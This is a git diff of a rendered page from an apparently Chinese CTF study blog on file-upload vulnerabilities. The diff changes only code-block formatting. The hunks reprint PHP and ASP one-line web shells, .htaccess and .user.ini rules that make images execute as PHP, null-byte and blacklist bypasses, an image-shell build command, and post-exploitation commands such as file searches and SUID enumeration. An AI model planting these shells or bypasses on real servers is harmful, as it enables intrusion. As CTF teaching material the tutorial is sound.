@@ -56,7 +56,7 @@
 
   
 
-  <link rel="stylesheet" href="//at.alicdn.com/t/c/font_4970977_2kzuzq5jacv.css" media="defer" onload="this.media='all'">
+  <link rel="stylesheet" href="https://at.alicdn.com/t/c/font_4970977_2kzuzq5jacv.css" media="defer" onload="this.media='all'">
 </head>
 <body>
 
@@ -76,7 +76,7 @@
 
 <widget class="widget-wrapper post-list"><div class="widget-header dis-select"><span class="name">最近更新</span></div><div class="widget-body fs14"><a class="item title" href="/2025/07/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"><span class="title">文件上传漏洞</span></a><a class="item title" href="/2025/07/09/CRLF%E6%BC%8F%E6%B4%9E/"><span class="title">CRLF漏洞</span></a><a class="item title" href="/2025/07/09/PHP%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/"><span class="title">PHP文件包含漏洞</span></a><a class="item title" href="/2025/07/09/PHP%E7%89%B9%E6%80%A7%E6%80%BB%E7%BB%93/"><span class="title">PHP特性总结</span></a><a class="item title" href="/2025/07/09/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><span class="title">PHP反序列化</span></a><a class="item title" href="/2025/07/09/php/"><span class="title">PHP</span></a><a class="item title" href="/2025/07/09/MySQL%20handler%E7%9A%84%E7%94%A8%E6%B3%95%E4%B8%8E%E5%BA%94%E7%94%A8/"><span class="title">MySQL handler的用法与应用</span></a><a class="item title" href="/2025/07/09/%5BSUCTF-2019%5DEasySQL/"><span class="title">(SUCTF 2019)EasySQL</span></a><a class="item title" href="/2025/07/09/%5B%E5%BC%BA%E7%BD%91%E6%9D%AF-2019%5D%E9%9A%8F%E4%BE%BF%E6%B3%A8/"><span class="title">强网杯2019随便注</span></a><a class="item title" href="/2025/07/09/%5Bflask%5DSSTI%201/"><span class="title">Buuctf [flask]SSTI</span></a></div></widget>
 </div>
-<footer class="footer dis-select"><div class="social-wrap"><a class="social" href="https://github.com/Ikunmma/Ikunmma.github.io" target="_blank" rel="external nofollow noopener noreferrer"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="icon-GitHub"/></a></div></footer>
+<footer class="footer dis-select"><div class="social-wrap"><a class="social" href="https://github.com/Ikunmma/Ikunmma.github.io" target="_blank" rel="external nofollow noopener noreferrer"><i class= "iconfont icon-GitHub"></i></a></div></footer>
 </div></aside><div class="l_main" id="main">
 
 
@@ -176,13 +176,13 @@
 <p>上传覆盖<code>.htaccess</code>文件，重写解析规则，将上传的带有脚本马的图片以脚本方式解析。</p>
 <h5 id="绕过-2"><a class="markdownIt-Anchor" href="#绕过-2"></a> 绕过</h5>
 <p>先命名成<code>a.htaccess</code>，bp抓包改成<code>.htaccess</code>即可，内容为：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">AddType application/x-httpd-php .jpg //让 .jpg 文件被解析为 PHP<br></code></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .jpg //让 .jpg 文件被解析为 PHP</span><br></pre></td></tr></table></figure>
 <p>再写个木马，改名为<code>shell.jpg</code>，内容为：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&lt;?php system($_GET[&#x27;cmd&#x27;]); ?&gt;<br></code></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php system($_GET[&#x27;cmd&#x27;]); ?&gt;</span><br></pre></td></tr></table></figure>
 <p>此时jpg文件会按照php文件被解析，也就是<code>shell.jpg</code>被当成php文件执行，然后开蚁剑/直接访问<code>shell.jpg</code>执行命令</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">http://example.com/uploads/shell.jpg?cmd=whoami<br></code></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/uploads/shell.jpg?cmd=whoami</span><br></pre></td></tr></table></figure>
 <h5 id="模板"><a class="markdownIt-Anchor" href="#模板"></a> 模板</h5>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">#对于php<br>AddType application/x-httpd-php .html  #将html文件作为php文件进行解析<br>#对于python<br>AddHandler cgi-script .py #将html文件作为php文件进行解析<br>Options +ExecCGI  <br>#对于Perl<br>AddHandler cgi-script .cgi .pl<br>Options +ExecCGI<br></code></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#对于php</span><br><span class="line">AddType application/x-httpd-php .html  #将html文件作为php文件进行解析</span><br><span class="line">#对于python</span><br><span class="line">AddHandler cgi-script .py #将html文件作为php文件进行解析</span><br><span class="line">Options +ExecCGI  </span><br><span class="line">#对于Perl</span><br><span class="line">AddHandler cgi-script .cgi .pl</span><br><span class="line">Options +ExecCGI</span><br></pre></td></tr></table></figure>
 <h4 id="apache解析漏洞"><a class="markdownIt-Anchor" href="#apache解析漏洞"></a> <code>Apache</code>解析漏洞</h4>
 <h5 id="基础-2"><a class="markdownIt-Anchor" href="#基础-2"></a> 基础</h5>
 <h6 id="原理-2"><a class="markdownIt-Anchor" href="#原理-2"></a> 原理</h6>
@@ -201,7 +201,7 @@
 <p>一般步骤：写并传马 -&gt; 抓包 -&gt; 改文件名 -&gt; 蚁剑</p>
 <blockquote>
 <h5 id="asp一句话木马注意文件后缀是asp"><a class="markdownIt-Anchor" href="#asp一句话木马注意文件后缀是asp"></a> asp一句话木马(注意文件后缀是asp)</h5>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&lt;%eval request(&quot;admin&quot;)%&gt;<br></code></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%eval request(&quot;admin&quot;)%&gt;</span><br></pre></td></tr></table></figure>
 </blockquote>
 <p><a target="_blank" rel="noopener" href="https://blog.csdn.net/song123sh/article/details/123513911">文件上传之IIS6.0解析漏洞_iis6解析漏洞利用-CSDN博客</a></p>
 <h4 id="iis70-iis75-nginx的解析漏洞"><a class="markdownIt-Anchor" href="#iis70-iis75-nginx的解析漏洞"></a> <code>IIS7.0 | IIS7.5 | Nginx</code>的解析漏洞</h4>
@@ -225,10 +225,10 @@
 <li>此目录下已有一个任意的<code>.php</code>文件</li>
 </ul>
 <h5 id="模板-2"><a class="markdownIt-Anchor" href="#模板-2"></a> 模板</h5>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">auto_prepend_file = &lt;filename&gt;         //将指定文件包含在该目录中所有php脚本的文件头部<br>auto_append_file = &lt;filename&gt;          //将指定文件包含在该目录中所有php脚本的文件尾部<br></code></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">auto_prepend_file = &lt;filename&gt;         //将指定文件包含在该目录中所有php脚本的文件头部</span><br><span class="line">auto_append_file = &lt;filename&gt;          //将指定文件包含在该目录中所有php脚本的文件尾部</span><br></pre></td></tr></table></figure>
 <h4 id="利用"><a class="markdownIt-Anchor" href="#利用"></a> 利用</h4>
 <p>先上传<code>a.user.ini.jpg</code>文件，内容：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">GIF89a                  //绕过exif_imagetype()<br>auto_prepend_file=test1.png //指定在主文件之前自动解析的文件的名称，并包含该文件，就像使用require函数调用它一样。它包含在所有php文件前先执行<br>auto_append_file=test1.png //解析后进行包含，它包含在所有php文件执行后执行<br></code></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GIF89a                  //绕过exif_imagetype()</span><br><span class="line">auto_prepend_file=test1.png //指定在主文件之前自动解析的文件的名称，并包含该文件，就像使用require函数调用它一样。它包含在所有php文件前先执行</span><br><span class="line">auto_append_file=test1.png //解析后进行包含，它包含在所有php文件执行后执行</span><br></pre></td></tr></table></figure>
 <p>bp抓包改名为<code>.user.ini</code></p>
 <p>再上传<code>test1.png</code>，没必要改名，其内容会被当做PHP文件内容执行。</p>
 <p>这句话：<code>auto_prepend_file</code>表示在php程序加载第一个php代码前加载的php文件</p>
@@ -239,7 +239,7 @@
 <p>PHP 文件的标准后缀始终是 <code>.php</code>，适用于所有版本的 PHP。然而，在某些特定场景或由某些开发者/系统中，使用<code>.php3</code> 、<code>.php5</code> 、<code>.php7</code> 等不是 PHP 语言的标准文件后缀,由于一些特殊的设置<code>.php7</code> 等后缀可被PHP解释器解析</p>
 <h4 id="利用-2"><a class="markdownIt-Anchor" href="#利用-2"></a> 利用</h4>
 <p>Apache 的配置文件或目录下的<code>.htaccess</code> 文件有添加设置，如<code>.php7</code>可被解析的配置为：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">AddHandler application/x-httpd-php .php7<br></code></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddHandler application/x-httpd-php .php7</span><br></pre></td></tr></table></figure>
 <h3 id="后端检测_文件头检测漏洞"><a class="markdownIt-Anchor" href="#后端检测_文件头检测漏洞"></a> 后端检测_文件头检测漏洞</h3>
 <h4 id="基础-4"><a class="markdownIt-Anchor" href="#基础-4"></a> 基础</h4>
 <h5 id="原理-5"><a class="markdownIt-Anchor" href="#原理-5"></a> 原理</h5>
@@ -248,15 +248,15 @@
 <p>GIF：</p>
 <p>16进制模式：<code>47 49 46 38 39 61</code></p>
 <p>对应文本：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">GIF89a<br></code></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br></pre></td></tr></table></figure>
 <p>png：</p>
 <p>16进制模式：<code>89 50 4E 47 0D 0A 1A 0A</code></p>
 <p>对应文本：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">‰PNG<br></code></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">‰PNG</span><br></pre></td></tr></table></figure>
 <p>JPG：</p>
 <p>16进制模式：<code>FF D8 FF E0 00 10 4A 46 49 46</code></p>
 <p>对应文本：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">ÿØÿà<br></code></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ÿØÿà</span><br></pre></td></tr></table></figure>
 <p>在进行文件头绕过时，我们可以把上面的文件头添加到我们的一句话木马内容最前面，达到绕过文件头检测的目的</p>
 <p>注：最好文件头和代码（木马）之间有个空格</p>
 <p>某些情况下，后端可能还会检测文件拓展名，此时需要结合<strong>解析漏洞</strong>或者<strong>文件包含</strong>才能实现执行木马</p>
@@ -274,13 +274,13 @@
 <p>我们就可以根据源码利用<code>%00</code>实现.php后缀</p>
 <h5 id="get传参保存路径"><a class="markdownIt-Anchor" href="#get传参保存路径"></a> GET传参保存路径</h5>
 <p>后端对文件路径的处理类似为</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">$des = $_GET[&#x27;road&#x27;] . &quot;/对文件名的处理操作......&quot; . $ext;<br></code></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$des = $_GET[&#x27;road&#x27;] . &quot;/对文件名的处理操作......&quot; . $ext;</span><br></pre></td></tr></table></figure>
 <p>此时<code>road</code>为我们可控的参数，可直接进行使用<code>%00</code>截断</p>
 <p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://raw.githubusercontent.com/zkk1233/Picture/main/20250214165443707.png" alt="j7ypxy6e" /></p>
 <p>由于使用<code>00</code>截断，所以最后文件保存在<code>/var/www/html/upload</code>,名为<code>shell.php</code>,根据位置，访问<code>/upload/shell.php</code>,即进入我们所在的页面</p>
 <h5 id="post传参保存路径"><a class="markdownIt-Anchor" href="#post传参保存路径"></a> POST传参保存路径</h5>
 <p>与GET传参类似的的是：后端对文件路径的处理类似为</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">$des = $_POST[&#x27;road&#x27;] . &quot;/对文件名的处理操作......&quot; . $ext;<br></code></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$des = $_POST[&#x27;road&#x27;] . &quot;/对文件名的处理操作......&quot; . $ext;</span><br></pre></td></tr></table></figure>
 <p>此时<code>road</code>为我们可控的参数，但与GET传参不同的是，<strong>http请求内包含文件时，POST参数不再被自动解码</strong>，所以POST传参需要使用BP使用查看16进制的请求详情，修改一个十六进制的为<code>00</code></p>
 <p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://raw.githubusercontent.com/zkk1233/Picture/main/20250214165818218.png" alt="2688a4e300bf53dea64eb094b8d2ae55" /></p>
 <p>步骤一：修改路径添加文件名，写入需要执行的代码语句</p>
@@ -291,7 +291,7 @@
 <h4 id="例题"><a class="markdownIt-Anchor" href="#例题"></a> 例题</h4>
 <h5 id="ctfhub-技能树-web-文件上传-00截断"><a class="markdownIt-Anchor" href="#ctfhub-技能树-web-文件上传-00截断"></a> <strong>CTFHUB-技能树-WEB-文件上传-00截断</strong></h5>
 <p>查看页面源代码发现后端的源码</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">if (!empty($_POST[&#x27;submit&#x27;])) &#123;<br>    $name = basename($_FILES[&#x27;file&#x27;][&#x27;name&#x27;]);<br>    $info = pathinfo($name);<br>    $ext = $info[&#x27;extension&#x27;];<br>    $whitelist = array(&quot;jpg&quot;, &quot;png&quot;, &quot;gif&quot;);<br>    if (in_array($ext, $whitelist)) &#123;<br>        $des = $_GET[&#x27;road&#x27;] . &quot;/&quot; . rand(10, 99) . date(&quot;YmdHis&quot;) . &quot;.&quot; . $ext;<br>        if (move_uploaded_file($_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;], $des)) &#123;<br>            echo &quot;&lt;script&gt;alert(&#x27;上传成功&#x27;)&lt;/script&gt;&quot;;<br>        &#125; else &#123;<br>            echo &quot;&lt;script&gt;alert(&#x27;上传失败&#x27;)&lt;/script&gt;&quot;;<br>        &#125;<br>    &#125; else &#123;<br>        echo &quot;文件类型不匹配&quot;;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">if (!empty($_POST[&#x27;submit&#x27;])) &#123;</span><br><span class="line">    $name = basename($_FILES[&#x27;file&#x27;][&#x27;name&#x27;]);</span><br><span class="line">    $info = pathinfo($name);</span><br><span class="line">    $ext = $info[&#x27;extension&#x27;];</span><br><span class="line">    $whitelist = array(&quot;jpg&quot;, &quot;png&quot;, &quot;gif&quot;);</span><br><span class="line">    if (in_array($ext, $whitelist)) &#123;</span><br><span class="line">        $des = $_GET[&#x27;road&#x27;] . &quot;/&quot; . rand(10, 99) . date(&quot;YmdHis&quot;) . &quot;.&quot; . $ext;</span><br><span class="line">        if (move_uploaded_file($_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;], $des)) &#123;</span><br><span class="line">            echo &quot;&lt;script&gt;alert(&#x27;上传成功&#x27;)&lt;/script&gt;&quot;;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            echo &quot;&lt;script&gt;alert(&#x27;上传失败&#x27;)&lt;/script&gt;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo &quot;文件类型不匹配&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>最关键的是这句代码：</p>
 <p><code>$des = $_GET['road'] . &quot;/&quot; . rand(10, 99) . date(&quot;YmdHis&quot;) . &quot;.&quot; . $ext;</code></p>
 <p>payload：</p>
@@ -323,7 +323,7 @@
 <h6 id="大小写绕过"><a class="markdownIt-Anchor" href="#大小写绕过"></a> 大小写绕过</h6>
 <p>比如：<code>aSp</code>和<code>pHp</code>之类</p>
 <p>默认情况下，正则匹配是区分大小写的</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">$pattern = &#x27;/\b(&#x27; . implode(&#x27;|&#x27;, $blacklist) . &#x27;)\b/i&#x27;; // 加 &#x27;i&#x27; 使匹配大小写忽略<br></code></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$pattern = &#x27;/\b(&#x27; . implode(&#x27;|&#x27;, $blacklist) . &#x27;)\b/i&#x27;; // 加 &#x27;i&#x27; 使匹配大小写忽略</span><br></pre></td></tr></table></figure>
 <h6 id="双写绕过"><a class="markdownIt-Anchor" href="#双写绕过"></a> 双写绕过</h6>
 <p>有时后端会把敏感字符替换为空，这就可以双写绕过了，比如<code>name.phphpp</code></p>
 <h6 id="黑名单的漏网之鱼"><a class="markdownIt-Anchor" href="#黑名单的漏网之鱼"></a> 黑名单的漏网之鱼</h6>
@@ -401,7 +401,7 @@
 </blockquote>
 <h4 id="图片马"><a class="markdownIt-Anchor" href="#图片马"></a> 图片马</h4>
 <p>cmd中</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">copy a.png /b + a.php /a 3.php  <br></code></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy a.png /b + a.php /a 3.php  </span><br></pre></td></tr></table></figure>
 <p>/b:指定以二进制格式复制、合并文件，用于图像或者声音类文件</p>
 <p>/a:指定以ascii格式复制、合并文件用于txt等文本类文件</p>
 <p>这条命令的意思是：通过copy命令，把<code>a.png</code>图片文件，以二进制文件形式添加到<code>a.php</code>文件中，以ASCII文本文件形式输出为<code>3.php</code>文件</p>
@@ -452,27 +452,27 @@
 <li>当前用户的主目录（如 <code>/home/username/flag</code>）</li>
 </ul>
 <p>可以使用以下命令查找 flag：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">?cmd=find / -name &quot;flag&quot; 2&gt;/dev/null<br></code></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=find / -name &quot;flag&quot; 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
 <p><code>2&gt;/dev/null</code>：忽略权限错误（避免输出过多无用信息）</p>
 <p>如果查找不到，在flag前后都加*来表示文件名包含 “flag” 的文件</p>
 <h3 id="检查当前目录"><a class="markdownIt-Anchor" href="#检查当前目录"></a> 检查当前目录</h3>
 <p>先用<code>?cmd=ls /</code>，再一步步查找flag</p>
 <p>不行的话就用：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">?cmd=ls -la<br></code></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=ls -la</span><br></pre></td></tr></table></figure>
 <p><code>ls -la</code>：列出当前目录下的所有文件（包括隐藏文件）</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">?cmd=ls -la /            列出根目录下所有文件<br></code></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=ls -la /            列出根目录下所有文件</span><br></pre></td></tr></table></figure>
 <p>如果发现可疑文件（如 <code>flag.txt</code> 或 <code>.flag</code>），可以使用 <code>cat</code> 命令查看内容</p>
 <h3 id="检查环境变量"><a class="markdownIt-Anchor" href="#检查环境变量"></a> 检查环境变量</h3>
 <p>有时 flag 可能存储在环境变量中。可以使用以下命令检查：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">?cmd=env<br></code></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=env</span><br></pre></td></tr></table></figure>
 <p>查找输出中是否包含 <code>FLAG</code> 或 <code>flag</code> 相关的变量</p>
 <h3 id="检查进程或服务"><a class="markdownIt-Anchor" href="#检查进程或服务"></a> 检查进程或服务</h3>
 <p>如果 flag 被某个进程或服务使用，可以通过以下命令查找：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">?cmd=ps aux<br></code></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=ps aux</span><br></pre></td></tr></table></figure>
 <p>查找可疑进程，特别是那些可能包含 flag 的命令或参数</p>
 <h3 id="检查文件内容"><a class="markdownIt-Anchor" href="#检查文件内容"></a> 检查文件内容</h3>
 <p>如果 flag 被隐藏在某个文件中，可以使用 <code>grep</code> 命令搜索文件内容：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">?cmd=grep -r &quot;flag&#123;&quot; / 2&gt;/dev/null<br></code></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=grep -r &quot;flag&#123;&quot; / 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
 <ul>
 <li><code>-r</code>：递归搜索目录。</li>
 <li><code>&quot;flag&#123;&quot;</code>：搜索包含 <code>flag&#123;</code> 的字符串（CTF 中 flag 通常以 <code>flag&#123;</code> 开头）。</li>
@@ -484,14 +484,14 @@
 <li>找到数据库配置文件（如 <code>config.php</code> 或 <code>.env</code>），获取数据库凭据。</li>
 <li>使用数据库客户端（如 <code>mysql</code>）连接数据库：</li>
 </ol>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">mysql -u username -p -h localhost<br></code></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -u username -p -h localhost</span><br></pre></td></tr></table></figure>
 <ol start="3">
 <li>查找 flag：</li>
 </ol>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">SHOW DATABASES;<br>USE target_database;<br>SHOW TABLES;<br>SELECT * FROM suspicious_table;<br></code></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SHOW DATABASES;</span><br><span class="line">USE target_database;</span><br><span class="line">SHOW TABLES;</span><br><span class="line">SELECT * FROM suspicious_table;</span><br></pre></td></tr></table></figure>
 <h3 id="检查备份文件"><a class="markdownIt-Anchor" href="#检查备份文件"></a> 检查备份文件</h3>
 <p>有时 flag 可能存在于备份文件中。可以查找常见的备份文件：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">find / -name &quot;*.bak&quot; 2&gt;/dev/null<br>find / -name &quot;*.backup&quot; 2&gt;/dev/null<br></code></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">find / -name &quot;*.bak&quot; 2&gt;/dev/null</span><br><span class="line">find / -name &quot;*.backup&quot; 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
 <h3 id="检查日志文件"><a class="markdownIt-Anchor" href="#检查日志文件"></a> 检查日志文件</h3>
 <p>flag 可能被记录在日志文件中。可以检查以下日志文件：</p>
 <ul>
@@ -500,17 +500,17 @@
 <li><code>/var/log/auth.log</code></li>
 </ul>
 <p>使用以下命令查看日志文件：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">cat /var/log/apache2/access.log | grep &quot;flag&quot;<br></code></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /var/log/apache2/access.log | grep &quot;flag&quot;</span><br></pre></td></tr></table></figure>
 <h3 id="提权如果需要"><a class="markdownIt-Anchor" href="#提权如果需要"></a> 提权（如果需要）</h3>
 <p>如果你当前权限不足，可以尝试提权：</p>
 <p>1.查找具有 SUID 或 SGID 权限的文件：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">find / -perm -u=s -o -perm -g=s 2&gt;/dev/null<br></code></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -o -perm -g=s 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
 <p>2.利用已知漏洞提权（如脏牛漏洞）：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">searchsploit linux kernel<br></code></pre></td></tr></table></figure>
